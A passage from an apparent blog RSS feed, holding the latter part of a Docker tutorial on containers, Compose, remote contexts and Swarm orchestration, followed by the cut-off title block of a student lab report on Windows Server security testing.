</span></span></code></pre></div><p>This command uses the <code>buildx</code> subcommand and the <code>-t</code> flag to tag (name) the image being built. The last part, <code>backend</code>, specifies the build context — in this case, the directory where the <code>Dockerfile</code> and required files are located.</p>
<p>Once the image is built, we can run the container using:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run manual-backend
</span></span></code></pre></div><p>This will start the container, but it will stop as soon as we press <code>Ctrl+C</code>. To keep it running in the background, we use the <code>-d</code> flag to run it in detached mode. We can also name the container using the <code>--name</code> flag.</p>
<p>Additionally, we need to map port <code>3000</code> from the container to the host using the <code>-p</code> option so that we can actually access the application. If we use a capital <code>-P</code> instead of a lowercase <code>-p</code>, Docker will map a random port on the host to the default exposed port of the container.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -d -p 3000:3000 --name manual-backend manual-backend:latest
</span></span></code></pre></div><p>Now we can list all running containers using:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker ps
</span></span></code></pre></div><p>This will display the container&rsquo;s name and hash ID, which can be used to identify it.</p>
<p>To view logs from the container, use:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker logs <span style="color:#f92672">[</span>CONTAINER_NAME or CONTAINER_ID<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>If we want to connect to the container&rsquo;s shell, we can use:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker exec -it <span style="color:#f92672">[</span>CONTAINER_NAME<span style="color:#f92672">]</span> sh
</span></span></code></pre></div><p>The <code>-i</code> and <code>-t</code> flags make the shell interactive with a TTY. This works because the container runs a full Alpine Linux system — if we had optimized the container to include only the compiled binary, this wouldn’t be possible.</p>
<p>To stop the container:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker stop <span style="color:#f92672">[</span>CONTAINER_NAME or CONTAINER_ID<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>To start it again:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker start <span style="color:#f92672">[</span>CONTAINER_NAME or CONTAINER_ID<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>To remove it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker rm <span style="color:#f92672">[</span>CONTAINER_NAME or CONTAINER_ID<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>To remove all stopped containers:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker container prune
</span></span></code></pre></div><p>Now only the backend is running inside a container, but we still need to package the frontend as well. For this step, we won’t build a custom image yet. Instead, we’ll use a single <code>docker run</code> command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker run -d --name manual-frontend -p 8080:80 <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -v <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>/nginx/frontend/index.html:/usr/share/nginx/html/index.html <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    -v <span style="color:#e6db74">&#34;</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span>/nginx/nginx.conf:/etc/nginx/conf.d/nginx.conf:ro <span style="color:#ae81ff">\
</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>    nginx:alpine
</span></span></code></pre></div><p>This command is a bit more complex since more things are happening:</p>
<ul>
<li>
<p>First, we map port <code>8080</code> on the host to port <code>80</code> in the container using the <code>-p</code> option. This allows us to access the application through the browser. We use <code>8080</code> on the host to avoid conflicts with existing services, so we don’t need to change the default <code>nginx</code> configuration.</p>
</li>
<li>
<p>Then, we use the <code>-v</code> flag (short for volume) to bind files from the host into the container. This way, we can edit the HTML file on the host and see the changes instantly in the container. The same applies to the Nginx configuration file, although changes to the config will require restarting the container. This method avoids the need to build a custom Docker image for now.</p>
</li>
<li>
<p>Finally, we specify the image to use: <code>nginx:alpine</code>, which is an official, lightweight image from the Docker registry.</p>
</li>
</ul>
<p>With both containers running, you can open <code>http://localhost:8080</code> in your browser and see the application working.</p>
<p>However, this method is still very inconvenient, which brings us to the next improvement in deploying our app.</p>
<h2 id="docker-compose">Docker compose</h2>
<p>To make multi-container deployments easily manageable, Docker offers <strong>Docker Compose</strong>, which allows you to define and control multiple containers using a single configuration file.</p>
<p>To do this, create a file called <code>docker-compose.yml</code>.</p>
<p>Let’s break down the structure of this file for our service:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">backend</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">backend:latest</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>: 
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">context</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">./backend</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">frontend</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">nginx:alpine</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;8080:80&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./nginx/frontend/index.html:/usr/share/nginx/html/index.html</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./nginx/nginx.conf:/etc/nginx/conf.d/nginx.conf:ro</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">backend</span>
</span></span></code></pre></div><p>The file starts with the <code>services</code> keyword, which defines each of the containers we want to run as attributes. Each container then has its own child attributes for configuration.</p>
<p>We begin by defining our backend container using the <code>backend:</code> key. We specify the image it should use — in this case, <code>backend</code>, which is the name we give it after building. To tell Docker Compose to build this image, we use the <code>build:</code> keyword and provide the <code>context:</code> attribute, which points to the path where the Dockerfile and source files are located.</p>
<p>Next, we define the frontend container, using the <code>nginx:alpine</code> image. We expose the necessary ports and bind the required files using volumes. This is much more manageable than writing out long <code>docker run</code> commands and is far easier to maintain.</p>
<p>We also use the <code>depends_on</code> option to ensure the frontend container only starts once the backend container is up and running. This helps guarantee that the application functions correctly without manual timing issues.</p>
<p>Additionally, we don’t need to publish any ports on the backend container. When using Docker Compose, a default Docker network is created for the containers in the stack. This allows containers to resolve each other by name, making internal communication seamless. For example, the frontend can reach the backend simply by using the container name as the hostname. This also means the backend doesn&rsquo;t need to be exposed to the outside world, which improves security by ensuring it can only be accessed through the frontend, without needing to configure firewalls or restrict public access manually.</p>
<p>Now, to deploy this, simply run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker compose up -d --build
</span></span></code></pre></div><p>This command builds all the images and deploys the containers. That’s it — you can just open your web browser and test everything. Thanks to volume mapping, any changes made to the HTML file will carry over immediately after a page reload.</p>
<p>You can inspect logs from the containers using:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker compose logs
</span></span></code></pre></div><p>To see the running containers, use:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker compose ps
</span></span></code></pre></div><p>To stop and remove all containers, use:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker compose down
</span></span></code></pre></div><p>If you run <code>docker compose up -d --build</code> again afterward, the containers will be rebuilt and restarted — but they remain running during the build process to minimize downtime. Only the containers with actual changes will be replaced.</p>
<p>This setup now provides a very usable and portable local development environment that&rsquo;s easy to manage. However, it still lacks production-readiness since deploying to a server still requires SSH access and copying the files over manually or pulling them from a Git repository.</p>
<p>That brings us to the next two improvements, which will be discussed in the following section.</p>
<h3 id="docker-context">Docker Context</h3>
<h2 id="docker-context-1">Docker Context</h2>
<p>Docker Context is a way to run Docker commands on a remote host <strong>without needing to SSH</strong> into your server like it&rsquo;s the stone age.</p>
<p>To add a server via SSH as a Docker context (assuming you have SSH key authentication already set up so no password prompt appears for each command), you can use the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker context create context_name --docker <span style="color:#e6db74">&#34;host=ssh://user@ip_address&#34;</span>
</span></span></code></pre></div><blockquote>
<p><strong>Note:</strong> The <code>host</code> value doesn&rsquo;t have to be an IP address — it could also be a Unix socket or another Docker-compatible host. SSH is just one method.</p></blockquote>
<h3 id="managing-contexts">Managing Contexts</h3>
<ul>
<li>
<p>To list all available contexts:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker context ls
</span></span></code></pre></div></li>
<li>
<p>To switch to a specific context:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker context use <span style="color:#f92672">[</span>CONTEXT_NAME<span style="color:#f92672">]</span>
</span></span></code></pre></div></li>
<li>
<p>To remove a context:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker context rm <span style="color:#f92672">[</span>CONTEXT_NAME<span style="color:#f92672">]</span>
</span></span></code></pre></div></li>
</ul>
<p>To see which context is currently active, run <code>docker context ls</code>. The active one will be marked with a <code>*</code>. If you&rsquo;re using the <strong>Starship</strong> prompt, it will display the active Docker context just like it shows the current Git branch or programming language.</p>
<p>Once a context is selected, <strong>all Docker commands will be executed on the remote machine</strong> instead of your local system.</p>
<hr>
<p>However, if you run <code>docker compose up -d --build</code> on the remote host now, you&rsquo;ll likely get an error about missing files used in volume mounts. This happens because the volume mounts are referencing local paths that don’t exist on the remote host.</p>
<p>To fix this, we’ll need to change the <code>docker-compose</code> file in the next step.</p>
<h4 id="overwriting-compose-files-and-optizing-the-setup">Overwriting compose files and optizing the setup</h4>
<p>To fix this issue, let&rsquo;s make a duplicate of the compose file and name it <code>compose.dev.yml</code>. We can then change our main compose file to the settings we want for deployment.
I updated the compose file as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">backend</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">backend:latest</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>: 
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">context</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">./backend</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">frontend</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">frontend:latest</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">context</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">./nginx</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;8080:80&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">backend</span>
</span></span></code></pre></div><p>Prior to this, we were mapping the files into the container using volumes. Now, instead, a new frontend image is built which copies the HTML and the Nginx configuration directly into the image.</p>
<p>In a production environment, you don&rsquo;t need the ability to update files live, so this makes the deployment more stable and less prone to accidental breakage. The new frontend image has the following contents:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Dockerfile" data-lang="Dockerfile"><span style="display:flex;"><span><span style="color:#66d9ef">FROM</span><span style="color:#e6db74"> nginx:alpine</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">RUN</span> rm /etc/nginx/conf.d/default.conf<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> nginx.conf /etc/nginx/conf.d/<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">COPY</span> frontend /usr/share/nginx/html<span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">EXPOSE</span><span style="color:#e6db74"> 80</span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">
</span></span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#66d9ef">CMD</span> [<span style="color:#e6db74">&#34;nginx&#34;</span>, <span style="color:#e6db74">&#34;-g&#34;</span>, <span style="color:#e6db74">&#34;daemon off;&#34;</span>]<span style="color:#960050;background-color:#1e0010">
</span></span></span></code></pre></div><p>It takes the Alpine Nginx image as a base, removes the default configuration, replaces it with the new one, copies the HTML file, sets the port to listen on, and defines the entry command.</p>
<p>Now, to still have a nice way to run the development version locally, the file from before comes into play, which has the following contents:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">frontend</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">nginx:alpine</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;8080:80&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">volumes</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./nginx/frontend/index.html:/usr/share/nginx/html/index.html</span>
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">./nginx/nginx.conf:/etc/nginx/conf.d/nginx.conf:ro</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">backend</span>
</span></span></code></pre></div><p>It currently only has the original frontend service. If we run <code>docker compose</code> with the <code>-f</code> option to specify multiple files — such as the original and a new override file — the second file will overwrite any matching sections (like <code>frontend</code>). This allows us to use the development version of the frontend.</p>
<p>The command would look like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker compose -f docker-compose.yml -f compose.dev.yml up -d
</span></span></code></pre></div><p>After all these changes, this is the current directory structure of the project:</p>
<pre tabindex="0"><code>├── backend
│   ├── Dockerfile
│   ├── go.mod
│   └── main.go
├── compose.dev.yml
├── docker-compose.yml
└── nginx
    ├── Dockerfile
    ├── frontend
    │   └── index.html
    └── nginx.conf
</code></pre><p>Now we can deploy both a development and a production version of our app to a remote server — which is already a solid place to stop for many small projects.</p>
<p>But to take it one step further, let&rsquo;s add <strong>orchestration</strong> to support <strong>replicas</strong> and <strong>multiple servers</strong>. This allows us to <strong>scale</strong> our application, <strong>balance traffic</strong>, and improve <strong>fault tolerance</strong> by ensuring that if one container or server fails, others can continue handling requests.</p>
<h2 id="docker-swarm">Docker Swarm</h2>
<p>Docker Swarm is a built-in container orchestrator for Docker that is simple to use yet powerful. It is very useful in a home lab environment since Kubernetes would be overkill, but it&rsquo;s also viable for small businesses and their production environments.</p>
<h3 id="what-is-container-orchestration">What is Container Orchestration?</h3>
<p>A good analogy is that container orchestration is like an orchestra where all the containers and services are the musicians playing instruments. The conductor (orchestrator) manages and syncs the musicians so a song is played instead of a mess.</p>
<p>The conductor — the master/control node — can replicate containers to scale the app, remove unhealthy ones, replace failed containers, and keep the app stable, running, and available.</p>
<h3 id="creating-a-docker-swarm">Creating a Docker Swarm</h3>
<p>Creating a Docker Swarm is simple: just run</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker swarm init
</span></span></code></pre></div><p>on the device you want to be the master node.</p>
<p>After this, you can check the swarm status with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker info
</span></span></code></pre></div><p>which will show that the node is now part of a swarm.</p>
<h3 id="adding-nodes">Adding Nodes</h3>
<p>To add nodes to the cluster, copy the command shown after <code>docker swarm init</code> and run it on another Docker host to join it to the cluster. On the master node, running</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker info
</span></span></code></pre></div><p>will show multiple nodes, and</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker node ls
</span></span></code></pre></div><p>will list all the nodes in the swarm.</p>
<p>Nodes can leave the cluster with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker swarm leave
</span></span></code></pre></div><p>Now the cluster is ready for deploying services.</p>
<h3 id="creating-a-stack">Creating a Stack</h3>
<p>Since we are using Swarm, we can no longer use plain <code>docker compose</code> commands; instead, we use <code>docker stack</code> commands.
<code>docker stack</code> uses the same Compose file format with some additional deployment options, but build options are not supported — images must be pre-built.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-yml" data-lang="yml"><span style="display:flex;"><span><span style="color:#f92672">services</span>:
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">backend</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">5000</span><span style="color:#ae81ff">/swarm-backend:latest</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>: 
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">context</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">./backend</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">deploy</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">replicas</span>: <span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">frontend</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">image</span>: <span style="color:#ae81ff">127.0.0.1</span>:<span style="color:#ae81ff">5000</span><span style="color:#ae81ff">/swarm-frontend:latest</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">build</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">context</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">./nginx</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">ports</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#e6db74">&#34;8080:80&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">depends_on</span>:
</span></span><span style="display:flex;"><span>      - <span style="color:#ae81ff">backend</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">deploy</span>:
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">replicas</span>: <span style="color:#ae81ff">2</span>
</span></span></code></pre></div><p>Now we can specify in the Compose file how many replicas we want for each container. The new addition is the <code>image</code> part, which will be explained in the next section because <code>docker stack</code> cannot build your containers directly — it requires already built images.</p>
<p>We can deploy this stack with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker stack deploy -c docker-compose.yml <span style="color:#f92672">[</span>STACK_NAME<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>Like Compose, this will create a network, but this time it deploys to our swarm cluster with the specified replicas.</p>
<p>With</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker service ls
</span></span></code></pre></div><p>we can see running services, whether they are replicated, and how many replicas are currently running. Docker dynamically spins containers up or down based on demand, which can be configured.</p>
<hr>
<h3 id="creating-a-local-registry">Creating a Local Registry</h3>
<p>To clarify the <code>image</code> part mentioned above where a local registry is used: this is needed so the built images can be used by the swarm stack.</p>
<p>To create a local registry, run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker service create --name registry --publish<span style="color:#f92672">=</span>5000:5000 registry:2
</span></span></code></pre></div><p>Now we can use the local registry with <code>localhost:5000</code> in the Compose file image tags.</p>
<p>You build images with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker compose build
</span></span></code></pre></div><p>and push them to the registry with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker compose push
</span></span></code></pre></div><p>so they can be used in the stack.</p>
<p>These are just two extra commands, but for production deployments you can set up CI/CD pipelines to do this automatically whenever you push to your git repository and update the running version without running Docker commands manually.</p>
<p>You can still run everything locally with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker compose up -d
</span></span></code></pre></div><p>to test the full setup.</p>
<hr>
<h3 id="scaling-the-service">Scaling the Service</h3>
<p>To manually scale a service, you can use the command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker service scale backend<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>
</span></span></code></pre></div><p>which would spin up 10 replicas of the <code>backend</code> service distributed across your nodes.</p>
<p>You can check which containers are running on which nodes with:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>docker stack ps <span style="color:#f92672">[</span>STACK_NAME<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>to see their state and placement.</p>
<p>You can further configure how nodes are scaled based on resources and other factors, but I will stop here. The main goal is to show the power and value of Docker and leave the rest of the learning to you. This gives you a working setup you can expand on to gain more experience.</p>
<blockquote>
<p>Note:
I changed the app to assign a random color based on the hostname so that when it is scaled up, you can visually see that different containers are handling your connections.</p></blockquote>
<p>The code for all setups is available on my GitHub <a href="https://github.com/Stefanistkuhl/goobering/tree/master/things/silly_docker_guide">here</a>.</p>
<p>Thanks for reading! :3</p>
<blockquote>
<p>TODO: Add citations to this at some point, include screenshots for examples, and add more info over time so this becomes a real blog post and not just notes for myself.</p></blockquote>
]]></content:encoded>
    </item>
    <item>
      <title>Security test of Windows Server</title>
      <link>http://localhost:1313/posts/itsi/year-3/exercise-9/security-test-of-windows-server/</link>
      <pubDate>Fri, 11 Apr 2025 03:33:09 +0200</pubDate>
      <guid>http://localhost:1313/posts/itsi/year-3/exercise-9/security-test-of-windows-server/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Note: this was converted using from LaTeX to Markdown using Chat GPT 4.1 the original pdf can be found &lt;a href=&#34;https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex9/Sicherheitstests%20von%20Windows%20Server.pdf&#34;&gt;here&lt;/a&gt; along with the &lt;a href=&#34;https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex9/zotero.bib&#34;&gt;bibliography&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;hr&gt;
&lt;h1 id=&#34;testing-windows-server-security&#34;&gt;Testing Windows server security&lt;/h1&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;Laboratory protocol&lt;/strong&gt;&lt;br&gt;
Exercise 9: Testing Windows server security&lt;br&gt;
&lt;figure&gt;
    &lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/itsi/y3/ex9/images/menthing.png&#34;/&gt; &lt;figcaption&gt;
            Figure: Grouplogo
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;strong&gt;Subject:&lt;/strong&gt; ITSI&lt;br&gt;
&lt;strong&gt;Class:&lt;/strong&gt; 3AHITN&lt;br&gt;
&lt;strong&gt;Name:&lt;/strong&gt; Stefan Fürst, Justin Tremurici&lt;br&gt;
&lt;strong&gt;Group Name/Number:&lt;/strong&gt; Name here/12&lt;br&gt;
&lt;strong&gt;Supervisor:&lt;/strong&gt; SPAC, ZIVK&lt;br&gt;
&lt;strong&gt;Exercise dates:&lt;/strong&gt; 14.03.2025 | 21.03.2025 | 28.03.2025 | 04.04.2025&lt;br&gt;
&lt;strong&gt;Submission date:&lt;/strong&gt; 11.04.2025&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;#task-definition&#34;&gt;Task definition&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#summary&#34;&gt;Summary&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#complete-network-topology-of-the-exercise&#34;&gt;Complete network topology of the exercise&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;#exercise-execution&#34;&gt;Exercise Execution&lt;/a&gt;
&lt;ul&gt;
